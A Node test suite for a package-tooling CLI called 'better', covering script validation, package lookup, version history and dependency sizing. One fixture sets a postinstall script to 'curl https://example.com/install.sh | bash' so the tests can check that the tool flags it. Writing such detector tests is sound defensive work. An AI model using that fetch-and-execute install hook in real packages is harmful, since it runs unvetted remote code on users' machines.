// test/scripts-check-pkg-info.test.js
// Tests for: better scripts-check, better pkg-info, better version-history,
//            better tarball-inspect, better which-pkg

import test from "node:test";
import assert from "node:assert/strict";
import fs from "node:fs/promises";
import path from "node:path";
import { execFile } from "node:child_process";
import { promisify } from "node:util";
import { makeTempDir, rmrf, writeJson } from "./helpers.js";

const execFileAsync = promisify(execFile);
const betterBin = path.resolve(process.cwd(), "bin", "better.js");

async function runBetter(args, cwd, extraEnv = {}) {
  try {
    const { stdout, stderr } = await execFileAsync(process.execPath, [betterBin, ...args], {
      cwd,
      env: { ...process.env, ...extraEnv, BETTER_LOG_LEVEL: "silent", NO_COLOR: "1" },
      timeout: 20_000
    });
    return { ok: true, stdout, stderr, exitCode: 0 };
  } catch (err) {
    return { ok: false, stdout: err.stdout ?? "", stderr: err.stderr ?? "", exitCode: err.code ?? 1 };
  }
}

// ── scripts-check ─────────────────────────────────────────────────────────────

test("scripts-check --help shows usage", async () => {
  const { stdout, ok } = await runBetter(["scripts-check", "--help"], process.cwd());
  assert.ok(ok, "scripts-check --help should succeed");
  assert.ok(
    stdout.includes("scripts") || stdout.includes("script") || stdout.includes("validate"),
    "should describe script validation"
  );
});

test("scripts-check --json returns ok for clean scripts", async () => {
  const dir = await makeTempDir("better-scripts-clean-");
  try {
    await writeJson(path.join(dir, "package.json"), {
      name: "test",
      version: "1.0.0",
      scripts: {
        test: "node --test",
        build: "tsc",
        lint: "eslint ."
      }
    });

    const { stdout, ok } = await runBetter(["scripts-check", "--json"], dir);
    assert.ok(ok, "scripts-check should succeed for clean scripts");
    const out = JSON.parse(stdout);
    assert.equal(out.ok, true);
    assert.ok(out.kind?.includes("scripts"), `unexpected kind: ${out.kind}`);
    assert.ok(typeof out.errors === "number", "should have errors count");
    assert.equal(out.errors, 0, "should have no errors for clean scripts");
  } finally {
    await rmrf(dir);
  }
});

test("scripts-check --json detects dangerous curl-pipe pattern", async () => {
  const dir = await makeTempDir("better-scripts-dangerous-");
  try {
    await writeJson(path.join(dir, "package.json"), {
      name: "test",
      version: "1.0.0",
      scripts: {
        postinstall: "curl https://example.com/install.sh | bash"
      }
    });

    const { stdout, ok, exitCode } = await runBetter(["scripts-check", "--json"], dir);
    assert.ok(!ok || exitCode !== 0, "scripts-check should fail for dangerous scripts");
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      assert.equal(out.ok, false);
      assert.ok(out.errors > 0, "should have errors");
      const issueList = out.issueList ?? out.issues ?? out.checks ?? [];
      assert.ok(
        issueList.some(i => i.severity === "error" && String(i.label ?? i.message ?? "").toLowerCase().includes("curl")),
        "should flag curl-pipe-to-bash as dangerous"
      );
    }
  } finally {
    await rmrf(dir);
  }
});

test("scripts-check --json warns about missing test script", async () => {
  const dir = await makeTempDir("better-scripts-notest-");
  try {
    await writeJson(path.join(dir, "package.json"), {
      name: "test",
      version: "1.0.0",
      scripts: {
        build: "tsc"
        // No test script
      }
    });

    const { stdout } = await runBetter(["scripts-check", "--json"], dir);
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      // Either ok=false or warnings about missing test
      const issueList = out.issueList ?? out.issues ?? out.checks ?? out.warnings ?? [];
      const hasTestWarning = issueList.some(i =>
        String(i.id ?? i.label ?? i.message ?? i.name ?? "").toLowerCase().includes("test")
      );
      assert.ok(hasTestWarning || !out.ok, "should warn about missing test script");
    }
  } finally {
    await rmrf(dir);
  }
});

test("scripts-check --json handles no scripts field gracefully", async () => {
  const dir = await makeTempDir("better-scripts-none-");
  try {
    await writeJson(path.join(dir, "package.json"), {
      name: "test",
      version: "1.0.0"
    });

    const { stdout } = await runBetter(["scripts-check", "--json"], dir);
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      assert.ok(typeof out.ok === "boolean", "should have ok field");
    }
  } finally {
    await rmrf(dir);
  }
});

// ── pkg-info ─────────────────────────────────────────────────────────────────

test("pkg-info --help shows usage", async () => {
  // pkg-info --help exits 1 when no package name given (by design)
  const { stdout } = await runBetter(["pkg-info", "--help"], process.cwd());
  assert.ok(
    stdout.includes("pkg-info") || stdout.includes("package") || stdout.includes("info"),
    "should describe package information"
  );
});

test("pkg-info requires a package name argument", async () => {
  const dir = await makeTempDir("better-pkginfo-noarg-");
  try {
    await writeJson(path.join(dir, "package.json"), { name: "test", version: "1.0.0" });
    const { ok, exitCode } = await runBetter(["pkg-info"], dir);
    assert.ok(!ok || exitCode !== 0, "pkg-info with no args should fail");
  } finally {
    await rmrf(dir);
  }
});

test("pkg-info --json fetches package info from npm registry (network-aware)", async (t) => {
  const result = await runBetter(["pkg-info", "is-odd", "--json"], process.cwd());
  if (!result.ok && (result.stderr.includes("ENOTFOUND") || result.stderr.includes("ETIMEDOUT") || result.stderr.includes("timed out"))) {
    t.skip("network unavailable");
    return;
  }
  if (result.stdout.trim()) {
    const out = JSON.parse(result.stdout);
    assert.equal(out.ok, true);
    assert.ok(out.kind?.includes("pkg-info"), `unexpected kind: ${out.kind}`);
    assert.equal(out.name, "is-odd", "should return info for is-odd");
    assert.ok(out.version, "should have a version");
    assert.ok(out.description, "should have a description");
  }
});

// ── which-pkg ────────────────────────────────────────────────────────────────

test("which-pkg --help shows usage", async () => {
  const { stdout, ok } = await runBetter(["which-pkg", "--help"], process.cwd());
  assert.ok(ok, "which-pkg --help should succeed");
  assert.ok(
    stdout.includes("which") || stdout.includes("package") || stdout.includes("path"),
    "should describe package path resolution"
  );
});

test("which-pkg --json finds installed package path", async () => {
  const dir = await makeTempDir("better-whichpkg-");
  try {
    await writeJson(path.join(dir, "package.json"), { name: "test", version: "1.0.0" });
    // Create a fake installed package
    const pkgDir = path.join(dir, "node_modules", "my-lib");
    await fs.mkdir(pkgDir, { recursive: true });
    await writeJson(path.join(pkgDir, "package.json"), {
      name: "my-lib", version: "1.0.0", main: "index.js"
    });

    const { stdout, ok } = await runBetter(["which-pkg", "my-lib", "--json"], dir);
    assert.ok(ok, "which-pkg should succeed for installed package");
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      assert.equal(out.ok, true);
      assert.ok(out.kind?.includes("which"), `unexpected kind: ${out.kind}`);
      // Path is in results[0].found.path or out.path/out.location
      const foundPath = out.results?.[0]?.found?.path ?? out.path ?? out.location ?? "";
      assert.ok(foundPath, "should report the package path");
      assert.ok(
        String(foundPath).includes("my-lib"),
        "path should reference my-lib"
      );
    }
  } finally {
    await rmrf(dir);
  }
});

test("which-pkg --json fails gracefully when package not installed", async () => {
  const dir = await makeTempDir("better-whichpkg-missing-");
  try {
    await writeJson(path.join(dir, "package.json"), { name: "test", version: "1.0.0" });

    const { stdout } = await runBetter(["which-pkg", "nonexistent-pkg-abc", "--json"], dir);
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      // ok=false when package not found (exit code may still be 0)
      assert.equal(out.ok, false, "should report ok:false when package not installed");
      const found = out.results?.[0]?.found;
      assert.ok(found === null || found === undefined, "found should be null for missing package");
    }
  } finally {
    await rmrf(dir);
  }
});

// ── tarball-inspect ────────────────────────────────────────────────────────────

test("tarball-inspect --help shows usage", async () => {
  const { stdout, ok } = await runBetter(["tarball-inspect", "--help"], process.cwd());
  assert.ok(ok, "tarball-inspect --help should succeed");
  assert.ok(
    stdout.includes("tarball") || stdout.includes("tgz") || stdout.includes("inspect"),
    "should describe tarball inspection"
  );
});

// ── version-history ────────────────────────────────────────────────────────────

test("version-history --help shows usage", async () => {
  // version-history --help exits 1 when no package name given (by design)
  const { stdout } = await runBetter(["version-history", "--help"], process.cwd());
  assert.ok(
    stdout.includes("version") || stdout.includes("history") || stdout.includes("changelog"),
    "should describe version history"
  );
});

test("version-history --json fetches version list for a package (network-aware)", async (t) => {
  const result = await runBetter(["version-history", "semver", "--json"], process.cwd());
  if (!result.ok && (result.stderr.includes("ENOTFOUND") || result.stderr.includes("ETIMEDOUT") || result.stderr.includes("timed out"))) {
    t.skip("network unavailable");
    return;
  }
  if (result.stdout.trim()) {
    const out = JSON.parse(result.stdout);
    if (out.ok) {
      assert.ok(out.kind?.includes("version"), `unexpected kind: ${out.kind}`);
      assert.ok(Array.isArray(out.versions), "should have versions array");
      assert.ok(out.versions.length > 0, "semver should have many versions");
    }
  }
});

// ── top-deps ─────────────────────────────────────────────────────────────────

test("top-deps --help shows usage", async () => {
  const { stdout, ok } = await runBetter(["top-deps", "--help"], process.cwd());
  assert.ok(ok, "top-deps --help should succeed");
  assert.ok(
    stdout.includes("top") || stdout.includes("dep") || stdout.includes("largest"),
    "should describe top deps inspection"
  );
});

test("top-deps --json returns sorted packages when node_modules exists", async () => {
  const dir = await makeTempDir("better-topdeps-");
  try {
    await writeJson(path.join(dir, "package.json"), { name: "test", version: "1.0.0" });
    const nmDir = path.join(dir, "node_modules");
    for (const [name, size] of [["small-pkg", 100], ["big-pkg", 10000]]) {
      await fs.mkdir(path.join(nmDir, name), { recursive: true });
      await writeJson(path.join(nmDir, name, "package.json"), { name, version: "1.0.0" });
      await fs.writeFile(path.join(nmDir, name, "index.js"), "x".repeat(size));
    }

    const { stdout, ok } = await runBetter(["top-deps", "--json"], dir);
    assert.ok(ok, "top-deps should succeed");
    if (stdout.trim()) {
      const out = JSON.parse(stdout);
      assert.equal(out.ok, true);
      assert.ok(out.kind?.includes("top-deps") || out.kind?.includes("top"), `unexpected kind: ${out.kind}`);
      assert.ok(Array.isArray(out.packages), "should have packages array");
      // big-pkg should be before small-pkg (sorted by size desc)
      const names = out.packages.map(p => p.name);
      const bigIdx = names.indexOf("big-pkg");
      const smallIdx = names.indexOf("small-pkg");
      if (bigIdx !== -1 && smallIdx !== -1) {
        assert.ok(bigIdx < smallIdx, "larger packages should come first");
      }
    }
  } finally {
    await rmrf(dir);
  }
});
